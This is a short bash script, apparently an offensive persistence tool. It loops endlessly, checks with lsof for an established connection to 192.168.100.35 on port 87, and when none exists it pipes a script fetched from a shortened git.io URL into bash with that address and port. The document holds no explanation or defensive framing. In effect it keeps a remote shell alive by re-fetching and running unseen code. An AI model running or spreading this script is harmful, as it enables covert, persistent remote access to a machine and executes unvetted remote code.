#!/bin/bash

while true; do

CHECK_IF_CONNECTED=$(lsof -i -P -n | grep ESTABLISHED)

if [[ "$CHECK_IF_CONNECTED" == *"192.168.100.35:87"* ]]; then

	echo ""	

else

	curl -Ls https://git.io/vXd2N | bash -s 192.168.100.35 87 & disown
	
fi
	
done
